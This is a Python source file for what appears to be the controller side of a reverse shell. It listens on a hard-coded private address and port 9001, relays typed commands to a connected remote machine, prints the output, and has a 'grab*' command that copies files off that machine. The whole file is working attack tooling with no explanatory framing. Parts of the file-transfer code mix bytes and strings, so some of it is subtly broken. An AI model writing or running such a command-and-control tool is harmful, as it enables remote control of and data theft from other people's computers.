import socket
import os

# HOST = '10.10.10.100'
HOST = '192.168.1.31'
PORT = 9001
DELIM = '\0'


def get_data(conn):
    while True:
        data = conn.recv(1024)
        if DELIM.encode('utf-8') in data:
            break
        else:
            yield data
    yield data[:-len(DELIM.encode('utf-8'))]


def grab_file(conn, cmd):
    filename = os.path.basename(cmd.split('*')[1])

    if os.path.exists(filename):
        print('File already exists')
    else:
        conn.send(cmd + DELIM)
        packet = conn.recv(1024)
        with open(filename, mode='wb') as f:
            while packet:
                if 'DoesNotExist' in packet:
                    print('[-] File does not exist')
                    break
                elif packet.endswith('DONE'):
                    f.write(packet[:-4])
                    print('[+] File transfer complete!')
                    break
                else:
                    f.write(packet)
                    packet = conn.recv(1024)


def main():
    sock = socket.socket()
    sock.bind((HOST, PORT))

    sock.listen(1)
    print('Waiting for connections on %s:%s' % (HOST, PORT))

    try:
        conn, addr = sock.accept()
    except KeyboardInterrupt:
        print('Shutting down')
        return

    print('Got connection from %s' % (addr,))
    while True:
        try:
            cmd = input('> ')

            if cmd:
                if 'grab*' in cmd:
                    grab_file(conn, cmd)
                else:
                    conn.send(f'{cmd}{DELIM}'.encode('utf-8'))

                    if cmd in ('exit', 'shutdown'):
                        conn.close()
                        sock.close()
                        break

                    resp_data = get_data(conn)
                    print(''.join(x.decode('utf-8') for x in resp_data))

        except KeyboardInterrupt:
            conn.send(f'shutdown{DELIM}'.encode('utf-8'))
            conn.close()
            sock.close()
            break


if __name__ == '__main__':
    main()
